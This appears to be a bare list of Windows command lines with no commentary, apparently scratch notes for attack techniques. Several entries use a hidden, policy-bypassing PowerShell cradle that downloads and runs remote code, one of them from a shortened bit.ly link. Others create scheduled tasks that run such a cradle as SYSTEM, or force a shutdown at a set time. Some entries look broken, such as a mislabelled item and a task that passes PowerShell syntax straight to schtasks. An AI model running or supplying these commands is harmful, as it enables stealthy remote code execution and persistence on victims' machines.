#1
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ($ie = New-Object -ComObject InternetExplorer.Application).Navigate('http://www.google.com')

#2
C:\Windows\System32\schtasks.exe /Create /TN "Last Task" /TR "shutdown -s -t 0" /SC ONCE /ST 23:59 /SD 21/12/2016

#3
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -nop -ep bypass -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1GdJt3F')"

#?
C:\Windows\System32\schtasks.exe /Create /TN "Last Task" /TR "iex(New-Object Net.WebClient).DownloadString('http://www.google.com')" /SC ONCE /ST 23:59 /SD 21/12/2016

#5
C:\Windows\System32\schtasks.exe /Create /TN "Last Task" /TR "%ComSpec% /c \"C:\Windows\System32\calc.exe\"" /SC ONCE /ST 23:59 /SD 21/12/2016

#6
C:\Windows\System32\schtasks.exe /Create /TN "Last Task" /TR "powershell -w hidden -nop -ep bypass -c iex(New-Object Net.WebClient).DownloadString('http://www.google.com')" /SC ONCE /ST 23:59 /SD 16/10/2015 /ru System

#7
schtasks.exe /Create /XML "C:\WebProjects\Projects\scripts\SystemTask.xml" /tn "SystemTask"


#cmd
C:\Windows\System32\cmd.exe start /min powershell -w hidden -nop -ep bypass -c "iex(New-Object Net.WebClient).DownloadString('http://www.google.com')"






